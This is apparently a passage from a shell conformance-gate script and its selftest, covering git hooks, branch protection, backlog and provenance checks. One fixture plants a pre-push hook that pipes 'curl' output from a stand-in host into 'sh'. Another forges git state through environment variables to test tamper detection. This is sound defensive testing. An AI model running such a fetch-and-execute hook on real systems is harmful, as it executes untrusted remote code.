        _id_gpdisp=$(sh "$CI_GATES_SH" --disposition gate-provenance conformance/gate-dispositions.txt || echo apply)
        if [ "$_id_gpdisp" = na ]; then
          # [security LOW-3, fix round 1] strip control characters from the echoed reason — a
          # disposition file's reason field is free text this gate does not own the review of.
          _id_reason=$(awk -F'\t' '!/^[[:space:]]*#/ && $1=="gate-provenance" && NF>=3 {print $3}' conformance/gate-dispositions.txt 2>/dev/null | head -1 | tr -d '[:cntrl:]')
          echo "N/A: gate-provenance repo-class — a private, user-owned deployable repo, but gate-provenance is validated na (${_id_reason:-reason on file}) — a conscious decision, not silence"
        elif [ "$MODE" = surface ]; then
          echo "OUTSTANDING: gate-provenance repo-class — a private, user-owned (non-org) deployable repo; the SLSA provenance/image-provenance CI job(s) will NEVER run here (profiles/*/ci.yml's push-only+visibility 'if:'). Make the repo public, move it to a GitHub org, or record a dated na disposition for gate-provenance in conformance/gate-dispositions.txt."
        else
          echo "FAIL: gate-provenance repo-class — a private, user-owned (non-org) deployable repo cannot pass Inception silently provenance-less; the SLSA provenance/image-provenance CI job(s) will NEVER run here (profiles/*/ci.yml's push-only+visibility 'if:'). Make the repo public, move it to a GitHub org, or record a dated na disposition for gate-provenance in conformance/gate-dispositions.txt."; fail=1
        fi
      else
        echo "PASS: gate-provenance repo-class — repo is public or org-owned; the SLSA provenance job(s) can run"
      fi
    fi
  fi
fi

# ── Decided-not-present legs (INCEPTION-DONE-DECIDED-NOT-PRESENT, 2026-09-01). STRICT ONLY: --surface
#    is "what incept scaffolded", and incept stamps the charter and ADR-000 PLACEHOLDERS by design
#    (its epilogue steps 1-2 are human judgment), so surface stays green right after incept and strict
#    reds until both decisions are recorded. Measured defect (ten-lens eval, 2026-09-01): strict
#    returned OK with §1 Overview still `[what problem this solves, for whom]` and ADR-000 still the
#    unfilled example — the exit gate proved presence, not decision.
#    Honest ceiling: what is detected is the TEMPLATE placeholder. A deleted section or a one-word
#    charter passes; whether the decision is GOOD stays the owner's Go/No-Go. The ADR leg reuses the
#    decision-integrity engine's own verdict: its unfilled-example N/A (correct for a lint that runs
#    all loop long) is a FAIL at THIS gate, and so is an absent ADR. Fail-closed if the engine is absent.
if [ "$MODE" = strict ]; then
  _id_ph=$(grep -c -F -e '[what problem this solves, for whom]' -e "[how we know it's working]" -e "[what's explicitly in / out]" CLAUDE.md 2>/dev/null || true)
  if [ "${_id_ph:-0}" -gt 0 ]; then
    echo "FAIL: charter undecided — CLAUDE.md §1 Overview still carries $_id_ph template placeholder line(s) (Problem / Vision / Scope); write the charter prose (incept epilogue step 1)"; fail=1
  else
    echo "PASS: charter decided — no §1 Overview template placeholder remains in CLAUDE.md"
  fi
  _id_adr=docs/architecture/ADR-000-stack.md
  if [ ! -f "$_id_adr" ]; then
    echo "FAIL: stack decision unrecorded — $_id_adr absent; record the real stack decision (incept epilogue step 2)"; fail=1
  else
    _id_dv=$(sh conformance/decision-integrity.sh stack "$_id_adr" 2>&1 || true)
    case "$_id_dv" in
      *"PASS:"*) echo "PASS: stack decision recorded — ADR-000 fit rationale cites a fit dimension" ;;
      *"unfilled example"*) echo "FAIL: stack decision unrecorded — $_id_adr fit rationale is still the unfilled example (incept epilogue step 2)"; fail=1 ;;
      *) echo "FAIL: stack decision — decision-integrity verdict: ${_id_dv:-UNVERIFIED (conformance/decision-integrity.sh not runnable)}"; fail=1 ;;
    esac
  fi
else
  echo "surface: charter + ADR-000 decision legs deferred to strict (incept epilogue steps 1-2 are judgment, not scaffold)"
fi

if [ "$fail" -ne 0 ]; then echo "FAIL: Inception-Done gate not satisfied in '$DIR'"; return 1; fi
echo "OK: Inception-Done gate satisfied in '$DIR'"
return 0
}

# ─────────────────────────────────────────────────────────────────────────────────────────────
# selftest() is the non-vacuity ORACLE MARKER: non-vacuity.sh mutates only lines strictly ABOVE
# this definition (the run_gate accumulators), then runs this --selftest; a neutered FAIL path that
# no fixture below catches is a VACUOUS check. So every FAIL verdict run_gate can print has a
# negative fixture here that asserts BOTH the SPECIFIC message AND the gate-not-satisfied return —
# an echo survives mutation, only the accumulator+return do not, so message-plus-return is the tooth.
# Fixtures are built with git clone (NEVER adopter-export — a kit-self surface would go N/A on an
# export tree). The st_* helpers and the st_fail accumulator live BELOW this marker so the mutation
# harness cannot neuter the test's own bookkeeping. Keep no literal <var>=1 token in any comment
# above this line (it would be a phantom accumulator to the lexer-less mutator).
selftest() {
  set +e   # the harness asserts explicitly; a fixture's non-zero return must not abort the sweep
  st_fail=0
  ROOT=$(unset CDPATH; cd "$(dirname "$0")/.." && pwd)
  WORK=$(mktemp -d)
  # Build the once-cloned fixture template. seed_fixture_template (below the oracle marker with the
  # st_* helpers) decides clone-vs-worktree-seed; its header documents the three cases (CP-5 + K9).
  if ! seed_fixture_template "$ROOT" "$WORK/tmpl"; then
    return 1
  fi

  # (a) tree with NO .git -> FAIL "not a git repository"
  echo "--- (a) no .git repository ---"
  d=$(st_mkfix a claude-code); st_install_hook "$d"; rm -rf "$d/.git"
  st_run "$d"
  st_has "FAIL: not a git repository"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b) repo but NO pre-push hook -> FAIL "pre-push git hook missing"
  echo "--- (b) repo, no pre-push hook ---"
  d=$(st_mkfix b claude-code); rm -f "$d/.git/hooks/pre-push"
  st_run "$d"
  st_has "PASS: git repository present"
  st_has "FAIL: pre-push git hook missing"
  # A7: the remedy text IS the control surface — pin it so a regression to "re-run incept" reds.
  st_has "cp hooks/pre-push"
  st_has "do NOT re-run incept"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b2) TRACKED-HOOKS mode (HOOK-INSTALL-RECURS-PER-SLICE Δ6) -> PASS with NO installed copy at all.
  # The gate's hook leg must accept EITHER install mode; before Δ6 it hard-coded the default hooks
  # path, so the one-time `core.hooksPath` keystroke that ends the re-copy treadmill left this gate
  # failing forever — and docs/adoption/brownfield.md said so out loud. st_tracked REMOVES the copy,
  # so this green can only come from the tracked hooks/pre-push being the live hook.
  echo "--- (b2) tracked-hooks mode (no installed copy) ---"
  d=$(st_mkfix b2 claude-code); st_tracked "$d"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "PASS present: pre-push git hook live"
  st_has "tracked-hooks mode"
  st_hasnt "FAIL: pre-push git hook missing"

  # (b3) tracked-hooks mode, hook NOT executable -> FAIL. The gate keeps its teeth in the new mode:
  # git silently ignores a non-executable hook, and in THIS mode the exec bit is a tracked file mode,
  # so the remedy is chmod + commit, never a re-copy.
  echo "--- (b3) tracked-hooks mode, hook not executable ---"
  d=$(st_mkfix b3 claude-code); st_tracked "$d"; chmod -x "$d/hooks/pre-push"
  st_run "$d"
  st_has "FAIL: pre-push git hook present but not executable"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b4) FALSE-POSITIVE LOCK: a core.hooksPath pointing at a FOREIGN dir is NOT tracked-hooks mode.
  # Δ6 must accept the tree's own tracked hooks/ dir specifically — not "any hooksPath is fine",
  # which would turn one husky config into a free pass past the hook leg. With no installed copy and
  # no live kit hook anywhere, the gate must still FAIL.
  echo "--- (b4) foreign hooksPath is not tracked-hooks mode ---"
  d=$(st_mkfix b4 claude-code); rm -f "$d/.git/hooks/pre-push"; git -C "$d" config core.hooksPath .husky
  st_run "$d"
  st_has "FAIL: pre-push git hook missing"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (b5) BLOCKER mirror (review round 1, both seats): in tracked-hooks mode the live hook is the
  # WORKING-TREE file, and the marker test used to short-circuit ahead of any comparison — so deleting
  # the KIT_GUARD_CORE line (the shape a cd-basename write produces — GUARD-BASENAME-AFTER-CD-BYPASS
  # now denies the single-command quote-free case in real time, its persisted-cwd/$VAR residuals still
  # produce it) turned an arbitrary-code hook into the reassuring "foreign hook preserved" PASS-with-note. The compare
  # against HEAD must run FIRST in this mode. Payload inert by construction (.invalid, RFC 2606).
  echo "--- (b5) tracked-hooks mode, MARKERLESS tampered hook ---"
  d=$(st_mkfix b5 claude-code); st_tracked "$d"
  printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
  st_run "$d"
  st_has "MODIFIED in the working tree"
  st_hasnt "foreign hook preserved"
  st_rc 1

  # (b6) FALSE-POSITIVE LOCK for that fix: an adopter whose OWN tracked hooks/pre-push carries no kit
  # marker and is UNMODIFIED keeps the brownfield PASS-with-note. The cure is PRECEDENCE, not a marker
  # requirement — judging "no marker => FAIL" would punish exactly this repo.
  echo "--- (b6) tracked-hooks mode, markerless hook that MATCHES HEAD ---"
  d=$(st_mkfix b6 claude-code)
  printf '#!/bin/sh\necho legacy hook\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
  git -C "$d" add -A >/dev/null 2>&1 || true
  git -C "$d" -c user.email=selftest@kit -c user.name=selftest commit -qm "adopter's own tracked hook" >/dev/null 2>&1 || true
  st_tracked "$d"
  st_run "$d" surface
  st_has "foreign hook preserved"
  st_hasnt "FAIL: pre-push git hook"

  # (b7) ENV-FORGE (review round 1, reviewer-measured): this leg's git calls were BARE, so ambient git
  # env could reroute them onto another repo's state and flip a genuine FAIL into a PASS — the same
  # SEC HIGH-1 class guard-wired.sh's _gw_git closed. Three vectors, one victim: a tree with NO live
  # hook in either mode, whose FAIL must survive (a) an injected core.hooksPath via the
  # GIT_CONFIG_COUNT/KEY/VALUE triad, (b) the same via GIT_CONFIG_PARAMETERS, (c) a DONOR repo whose
  # own config carries the setting, reached through GIT_DIR with GIT_WORK_TREE aimed at the victim.
  echo "--- (b7) env-forged git state must not flip the hook leg ---"
  d=$(st_mkfix b7 claude-code); rm -f "$d/.git/hooks/pre-push"
  OUT=$( ( GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: pre-push git hook missing"
  OUT=$( ( GIT_CONFIG_PARAMETERS="'core.hookspath'='hooks'" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: pre-push git hook missing"
  b7donor=$(st_mkfix b7donor claude-code); git -C "$b7donor" config core.hooksPath hooks
  OUT=$( ( GIT_DIR="$b7donor/.git" GIT_WORK_TREE="$d" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: pre-push git hook missing"

  # (b8) m2 (review round 2) — tracked mode, HEAD exists but hooks/pre-push is NOT committed at HEAD.
  # The old `else` arm read this as _id_hm_rc=0 ("verified match"), so an uncomparable live hook took
  # the "PASS present … live via tracked-hooks mode" line — the fail-OPEN where guard-wired REDs. Now
  # it FAILs, mirroring guard-wired's tracked "missing from HEAD". Built like rung_trackedmissing:
  # unstage+commit the removal so HEAD has commits but no hooks/pre-push blob, then flip to tracked.
  echo "--- (b8) tracked mode, hooks/pre-push not committed at HEAD ---"
  d=$(st_mkfix b8 claude-code)
  git -C "$d" rm --cached -q hooks/pre-push >/dev/null 2>&1
  git -C "$d" -c user.email=selftest@kit -c user.name=selftest commit -qm "drop tracked hook" >/dev/null 2>&1
  st_tracked "$d"
  st_run "$d"
  st_has "not committed at HEAD"
  st_hasnt "live via tracked-hooks mode"
  st_rc 1

  # (b9) m2 — the DELIBERATE divergence from guard-wired: tracked mode on a repo with NO commits at
  # all (HEAD unborn). Not a tamper, and not verified either: an honest N/A that never prints the live
  # PASS (requirement a) and does not false-RED a legitimate pre-first-commit tree (requirement b).
  # Built by re-initialising a cloned fixture so HEAD is unborn while the working tree stays intact.
  echo "--- (b9) tracked mode, unborn HEAD (no commits yet) ---"
  d=$(st_mkfix b9 claude-code); rm -rf "$d/.git"; git -C "$d" init -q >/dev/null 2>&1
  st_tracked "$d"
  st_run "$d" surface
  st_has "HEAD unborn"
  st_has "NOT counted as a verified guard"
  st_hasnt "live via tracked-hooks mode"

  # (c) --harness generic (floor): repo leg live, hook leg live, floor guard-line, NO PreToolUse.
  # We assert the SPECIFIC legs T3 locks, NOT the whole-gate "OK: gate satisfied" verdict — that
  # verdict ALSO requires docs/architecture/ADR-000*.md + BACKLOG.md, both `export-ignore`d
  # (.gitattributes), so asserting it would couple the selftest to the tree it runs in: it would
  # FAIL on an export tree and for any real adopter who runs verify.sh BEFORE creating their
  # ADR/BACKLOG. A selftest must build its OWN world — these three legs print regardless of those.
  echo "--- (c) generic (floor) ---"
  d=$(st_mkfix c generic); st_install_hook "$d"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "PASS present: pre-push git hook installed and executable"
  st_has "runtime guard = floor (git hook + CI backstop); 'generic' has no inline command-guard"
  st_hasnt "PreToolUse"

  # (d) --harness claude-code (native): repo leg live, hook leg live, harness-aware PreToolUse leg.
  # Same rationale as (c): assert the native guard leg (harness-aware PreToolUse), NOT the whole-gate
  # verdict — so the fixture is independent of the export-ignored ADR/BACKLOG.
  echo "--- (d) claude-code (native) ---"
  d=$(st_mkfix d claude-code); st_install_hook "$d"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "PASS present: pre-push git hook installed and executable"
  st_has "'claude-code' runtime guard wired (PreToolUse"

  # (d2) B3 r3 HIGH-A: a FLAGGED proof.check ("<path> --rung1-only") must resolve and EXECUTE
  # correctly, not fail-closed with a false "missing" message. (d) above happens to exercise this
  # too, because the kit's OWN adapters/claude-code/adapter.json currently carries this flag — but
  # that coupling is silent and would stop testing the mirrored parse the moment that manifest's
  # proof.check changes shape. This fixture is self-contained: it manufactures its OWN harness
  # ("fixtureharness") and adapter.json declaring ONLY command-guard, so the assertion never
  # depends on what the real claude-code adapter happens to say. Also the negative half of the
  # cross-consumer guarantee: harness-adapter.sh already asserts this exact shape (its own
  # flagok/flagselftest/flagtrailspace fixtures) — this proves the OTHER declared consumer
  # (inception-done.sh) parses the identical manifest shape the identical way.
  echo "--- (d2) flagged proof.check resolves + executes (HIGH-A mirror) ---"
  d=$(st_mkfix d2 fixtureharness); st_install_hook "$d"
  mkdir -p "$d/adapters/fixtureharness"
  printf '%s\n' '{"dimensions":{"command-guard":{"level":"native","proof":{"check":"conformance/guard-wired.sh --rung1-only"}}}}' > "$d/adapters/fixtureharness/adapter.json"
  st_run "$d" surface
  st_has "'fixtureharness' runtime guard wired (PreToolUse"
  st_hasnt "is missing or invalid (fail-closed)"

  # (e) adapter.json missing -> fail-closed FAIL
  echo "--- (e) adapter.json missing ---"
  d=$(st_mkfix e claude-code); st_install_hook "$d"; rm -f "$d/adapters/claude-code/adapter.json"
  st_run "$d"
  st_has "adapters/claude-code/adapter.json missing, cannot classify 'claude-code'"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (e2) adapter.json invalid (level unreadable) -> fail-closed FAIL
  echo "--- (e2) adapter.json invalid ---"
  d=$(st_mkfix e2 claude-code); st_install_hook "$d"; printf 'not json{' > "$d/adapters/claude-code/adapter.json"
  st_run "$d"
  st_has "command-guard level unreadable"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (f) brownfield foreign pre-push (no kit marker) -> PASS-with-note, not a hook FAIL.
  # Assert the foreign-hook leg (repo live + "foreign hook preserved" note + no hook FAIL), NOT the
  # whole-gate verdict — export/ADR/BACKLOG-independent, same rationale as (c)/(d).
  echo "--- (f) foreign pre-push hook (brownfield) ---"
  d=$(st_mkfix f claude-code); printf '#!/bin/sh\necho foreign\nexit 0\n' > "$d/.git/hooks/pre-push"; chmod +x "$d/.git/hooks/pre-push"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "foreign hook preserved"
  st_hasnt "FAIL: pre-push git hook"

  # (g) K9 — pre-incept HEAD: a commit EXISTS but HEAD does NOT track hooks/pre-push (it predates
  # inception). The broken clone fast-path would copy that INCOMPLETE tree and the resulting template
  # would silently LACK hooks/pre-push. seed_fixture_template must gate the clone on HEAD tracking
  # hooks/pre-push and fall back to the worktree-seed, so the template DOES contain hooks/pre-push.
  # This drives seed_fixture_template directly (the fixture-BUILD layer), which the (a)-(f) cases,
  # keyed off the already-built $WORK/tmpl, cannot reach.
  echo "--- (g) K9 pre-incept HEAD (worktree-seed fallback) ---"
  PRE="$WORK/g-pre"; PRETMPL="$WORK/g-tmpl"   # PRETMPL must NOT pre-exist (clone fast-path needs it absent)
  mkdir -p "$PRE/hooks"
  printf '#!/bin/sh\n# KIT_GUARD_CORE\n' > "$PRE/hooks/pre-push"   # incepted worktree marker, UNTRACKED
  printf 'spec\n' > "$PRE/SPEC.md"
  git -C "$PRE" init -q
  git -C "$PRE" add SPEC.md   # commit ONLY the spec-only file => a genuine pre-incept HEAD
  git -C "$PRE" -c user.email=selftest@kit -c user.name=selftest commit -qm "pre-incept spec-only" >/dev/null 2>&1
  if seed_fixture_template "$PRE" "$PRETMPL" >/dev/null 2>&1 && [ -f "$PRETMPL/hooks/pre-push" ]; then
    printf '    ok  : pre-incept-HEAD seed contains hooks/pre-push (worktree-seed, not the broken clone)\n'
  else
    printf '    BAD : pre-incept-HEAD seed LACKS hooks/pre-push (clone copied an incomplete HEAD — K9)\n'; st_fail=1
  fi

  # ── Branch-protection leg (K5): every mode×host cell asserts a discriminating MESSAGE, not just rc.
  # (h) GitHub, verified-unprotected (bp exit 1) -> FAIL both modes
  echo "--- (h) github unprotected (bp exit 1) ---"
  d=$(st_mkfix h claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 1
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "NOT protected"; st_rc 1
  st_run "$d" surface; st_has "FAIL: branch protection"

  # (h0) GitHub, protected (bp exit 0) -> PASS verified
  echo "--- (h0) github protected (bp exit 0) ---"
  d=$(st_mkfix h0 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  st_run "$d" strict;  st_has "PASS: verified protected"

  # (h4) GitHub, protected but a DECLARED context unbound (bp exit 1 naming it) -> strict FAIL / surface
  # OUTSTANDING, naming the context and the --apply remedy — never the generic "NOT protected" text
  # (V1 repair PR 2: an incepted repo declares the gates it installed; unbound = fail-open, refused by name).
  echo "--- (h4) github protected, declared context unbound (bp exit 1 + FAIL line) ---"
  d=$(st_mkfix h4 claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub "$d" 1 'FAIL: required-check context(s) declared in REQUIRED-CHECKS.md but not live on main: backlog-presence ceremony-binding — run: sh scripts/branch-protection-apply.sh --apply'
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "NOT bound: backlog-presence ceremony-binding"; st_has "branch-protection-apply.sh --apply"; st_hasnt "NOT protected"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_has "NOT bound: backlog-presence ceremony-binding"; st_hasnt "FAIL: branch protection"
  # (h4m) MIRROR LOCK: h4 pins the parser against a hand-copied literal, so the producer could be reworded
  # with every cell green. Assert the REAL producer still emits both anchors the parser keys on.
  echo "--- (h4m) producer wording mirror (conformance/branch-protection.sh) ---"
  _bpsrc="$(dirname "$CI_GATES_SH")/branch-protection.sh"   # the kit's own, resolved like ci-gates.sh — never the fixture's stub
  if grep -q 'FAIL: required-check context(s) declared in .* but not live on .* — run: ' "$_bpsrc"; then echo "    ok  : producer anchors present (one line: prefix, on <branch>:, — run:)"; else echo "    FAIL: conformance/branch-protection.sh no longer emits the one-line 'FAIL: required-check context(s) declared in … but not live on …: … — run: …' inception-done parses — update BOTH sides"; st_fail=1; fi
  # (h5) COMPOUND rc 1 — unbound line PLUS another FAIL (no reviews required): the friendly arm must NOT be taken in either mode.
  echo "--- (h5) github unbound + reviews-not-required (compound rc 1) -> FAIL both modes ---"
  d=$(st_mkfix h5 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 1 'FAIL: required PR reviews are not enabled on main
FAIL: required-check context(s) declared in REQUIRED-CHECKS.md but not live on main: backlog-presence — run: sh scripts/branch-protection-apply.sh --apply'
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "NOT protected"; st_hasnt "OUTSTANDING"; st_rc 1
  st_run "$d" surface; st_has "FAIL: branch protection"; st_hasnt "OUTSTANDING: branch protection"

  # (h2) GitHub, unverifiable (bp exit 2) -> strict FAIL / surface OUTSTANDING. Both rc-2 messages
  # must state BOTH causes (D(i), A3): rc 2 is measured with authenticated gh + a nonexistent repo,
  # so "(no gh / unauthenticated)" alone is a wrong remedy.
  echo "--- (h2) github unverifiable (bp exit 2) ---"
  d=$(st_mkfix h2 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 2
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "unverifiable"; st_has "inaccessible/nonexistent"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_has "inaccessible/nonexistent"; st_hasnt "FAIL: branch protection"

  # (h3) LIVENESS: REAL branch-protection.sh (no stub), forced no-gh -> raw exit 2 -> OUTSTANDING (surface)
  # proves the leg actually invokes the real script with --raw, not only the stub.
  echo "--- (h3) github unverifiable via REAL script (BP_FORCE_NO_GH) ---"
  d=$(st_mkfix h3 claude-code); st_install_hook "$d"; st_gh "$d"
  OUT=$( ( export BP_FORCE_NO_GH=1; MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: branch protection"

  # (i) non-GitHub, attested -> PASS attested
  echo "--- (i) non-github attested ---"
  d=$(st_mkfix i claude-code); st_install_hook "$d"; st_nongh "$d"; st_attest "$d"
  st_run "$d" strict;  st_has "PASS: branch protection attested (non-GitHub host)"

  # (i2) non-GitHub, NOT attested -> strict FAIL / surface OUTSTANDING
  echo "--- (i2) non-github unattested ---"
  d=$(st_mkfix i2 claude-code); st_install_hook "$d"; st_nongh "$d"
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "no valid recorded attestation"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_hasnt "FAIL: branch protection"

  # (i3) non-GitHub, PLACEHOLDER attestation left unfilled -> fail-closed (NOT a valid attestation)
  echo "--- (i3) non-github placeholder attestation ---"
  d=$(st_mkfix i3 claude-code); st_install_hook "$d"; st_nongh "$d"
  printf '%s\n' '- **Branch protection** (§branch-protection): attested: <host + mechanism>' >> "$d/CLAUDE.md"
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "no valid recorded attestation"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_hasnt "FAIL: branch protection"

  # (j) no remote, strict -> FAIL
  echo "--- (j) no remote, strict ---"
  d=$(st_mkfix j claude-code); st_install_hook "$d"; st_norem "$d"
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "no remote configured"; st_rc 1

  # (k) no remote, surface -> OUTSTANDING
  echo "--- (k) no remote, surface ---"
  d=$(st_mkfix k claude-code); st_install_hook "$d"; st_norem "$d"
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_hasnt "FAIL: branch protection"

  # (l) GitHub, unknown bp exit (3) -> fail-closed FAIL
  echo "--- (l) github unknown bp exit -> fail-closed ---"
  d=$(st_mkfix l claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 3
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_rc 1

  # (m) A3 lock — the incept epilogue: the printed next-steps must name the FIRST-commit step
  # (docs/adoption/inception-bootstrap.md) and the stage-appropriate verify (--surface now; the bare
  # strict command only once a protected remote exists — strict's no-remote arm is FAIL by design and
  # stays asserted UNCHANGED by (j)/(k) above). Load-bearing negative: an epilogue printing the bare
  # strict command as the immediate verify ("Verify: sh conformance/inception-done.sh") is the
  # measured cold-adopter defect and must FAIL here. Drives scripts/incept.sh's argument-borne
  # __emit-epilogue seam — the real emitter, no full inception run.
  echo "--- (m) incept epilogue: commit step + stage-appropriate verify ---"
  if [ ! -f "$ROOT/scripts/incept.sh" ]; then
    # Review Minor 2: honest fallback — an adopter tree that deleted incept post-inception has no
    # emitter to lock; say so instead of an opaque rc-127 red. Never n/a on a tree that ships it.
    echo "selftest n/a: (m) skipped — $ROOT/scripts/incept.sh absent (epilogue emitter not on this tree)"
  else
  OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue 2>&1 ); RC=$?
  st_rc 0
  st_has "Commit the incepted baseline — the FIRST commit"
  st_has "Verify now: sh conformance/inception-done.sh --surface"
  st_has "Verify when a protected remote exists: sh conformance/inception-done.sh"
  st_hasnt "Verify: sh conformance/inception-done.sh"
  # Review Minor 1: ORDER is part of the claim ("says the right things in the right ORDER") — the
  # commit step must precede "Verify now", which must precede the strict line. Presence alone
  # passed a mutation that relocated the commit step after the verify lines; these line-number
  # comparisons close that.
  _ln_commit=$(printf '%s\n' "$OUT" | grep -n "Commit the incepted baseline" | head -n 1 | cut -d: -f1)
  _ln_snow=$(printf '%s\n' "$OUT" | grep -n "Verify now:" | head -n 1 | cut -d: -f1)
  _ln_strict=$(printf '%s\n' "$OUT" | grep -n "Verify when a protected remote exists:" | head -n 1 | cut -d: -f1)
  if [ -n "$_ln_commit" ] && [ -n "$_ln_snow" ] && [ -n "$_ln_strict" ] \
     && [ "$_ln_commit" -lt "$_ln_snow" ] && [ "$_ln_snow" -lt "$_ln_strict" ]; then
    echo "GOOD: epilogue order — commit step ($_ln_commit) < Verify now ($_ln_snow) < strict ($_ln_strict)"
  else
    echo "BAD : epilogue ORDER wrong — commit=$_ln_commit verify-now=$_ln_snow strict=$_ln_strict (commit step must come first, staged verify lines after, strict last)"
    st_fail=1
  fi
  fi

  # (n) B6 rider (a): an UNFILLED CHOICE-LIST backend declaration — CLAUDE.md's field still reads
  # `Backlog backend (§...): [md/github/jira/ado/linear/gitlab]` — with NO BACKLOG.md present must
  # FAIL. This is the MEASURED defect this rider fixes: the old literal `grep -q "Backlog backend"`
  # matched the FIELD NAME regardless of whether its value was ever actually chosen, so this exact
  # tree passed Inception-Done and then every board gate (backlog-presence, backlog-current) silently
  # N/A'd forever, because resolve_backend correctly reads an unfilled choice-list as UNDECLARED. A
  # regression here means Inception-Done and the board gates disagree again about what "declared"
  # means. Assert the SPECIFIC leg, not the whole-gate verdict (same rationale as (c)/(d)/(f) above).
  echo "--- (n) unfilled choice-list backlog backend (measured defect, rider a negative) ---"
  d=$(st_mkfix n claude-code); st_install_hook "$d"
  # The fixture template is cloned from THIS repo's own tracked tree, which carries its OWN real
  # BACKLOG.md — remove it so the fixture genuinely represents "no board, no declared backend" (the
  # measured defect's actual precondition), not "board present" (a different, already-PASS leg).
  rm -f "$d/BACKLOG.md"
  printf '%s\n' '- **Backlog backend** (§6): [md/github/jira/ado/linear/gitlab]' >> "$d/CLAUDE.md"
  st_run "$d" surface
  st_has "FAIL missing: BACKLOG.md or a declared backlog backend"
  st_hasnt "PASS present: backlog"

  # (o) B6 rider (a): an UNRECOGNIZED/fat-fingered backend token must FAIL-CLOSED, never be read as
  # "no backend declared" (which would silently N/A the board gates instead of naming the typo).
  echo "--- (o) unrecognized backlog backend token (rider a fail-closed) ---"
  d=$(st_mkfix o claude-code); st_install_hook "$d"
  printf '%s\n' '- **Backlog backend** (§6): markdow' >> "$d/CLAUDE.md"
  st_run "$d" surface
  st_has "FAIL: backlog backend 'markdow' is not a recognized token"

  # (p) B6 rider (a) positive: a VALID, filled backend declaration must PASS this leg even with no
  # BACKLOG.md on disk yet (e.g. a jira/ado backend never has one) — the fix must not narrow the
  # legitimate non-md case.
  echo "--- (p) valid non-md backend declared (rider a positive) ---"
  d=$(st_mkfix p claude-code); st_install_hook "$d"
  printf '%s\n' '- **Backlog backend** (§6): jira' >> "$d/CLAUDE.md"
  st_run "$d" surface
  st_has "PASS present: backlog (declared backend: jira)"

  # ── B8 §4.3 (GATE-PROVENANCE-SELF-DISABLES-AND-NEVER-GATES-THE-MERGE, PHASE-B-SPINE) — the
  # repo-class leg: a deployable, private, user-owned (non-org) repo cannot pass Inception silently
  # provenance-less, because the SLSA provenance/image-provenance CI job(s) never run there at all
  # (profiles/*/ci.yml's push-only+visibility `if:`). Seam-stubbed via INCEPTION_DONE_GH_CMD (the
  # st_bpstub precedent) so fixtures never touch the network.
  _id_mkdisp_apply() { # <dir> — an all-apply 8-id dispositions file (no na anywhere)
    mkdir -p "$1/conformance"
    { for _g in gate-lint gate-type-check gate-test gate-build gate-secret-scan gate-dep-scan gate-sbom gate-provenance; do
        printf '%s\tapply\tfixture\n' "$_g"
      done
    } > "$1/conformance/gate-dispositions.txt"
  }
  _id_mkdisp_na() { # <dir> — 8-id file: gate-provenance na (a validated conscious decision), rest apply.
    # Written EXPLICITLY, never inherited from the template tree: the tmpl is a clone of the ambient
    # repo, and conformance/gate-dispositions.txt is export-ignore'd — a fixture leaning on the
    # tmpl's copy greens on the dev tree and reds on every incepted export (measured: PR #513
    # battery 1, all five export-context verify jobs, fixture (r)). The in-export selftest is the
    # decisive verification for anything export-shipped — fixtures must be tree-hermetic.
    mkdir -p "$1/conformance"
    { for _g in gate-lint gate-type-check gate-test gate-build gate-secret-scan gate-dep-scan gate-sbom; do
        printf '%s\tapply\tfixture\n' "$_g"
      done
      printf 'gate-provenance\tna\tfixture: provenance consciously dispositioned\n'
    } > "$1/conformance/gate-dispositions.txt"
  }
  _priv_stub='printf {"isPrivate":true,"isInOrganization":false}'
  _pub_stub='printf {"isPrivate":false,"isInOrganization":false}'

  # (q) deployable + private + user-owned + gate-provenance UNDECIDED (apply) -> strict FAIL /
  # surface OUTSTANDING (the spine AC, verbatim: "a private user-owned deployable repo cannot pass
  # Inception silently provenance-less").
  echo "--- (q) gate-provenance repo-class: deployable + private + user-owned -> FAIL/OUTSTANDING ---"
  d=$(st_mkfix q claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
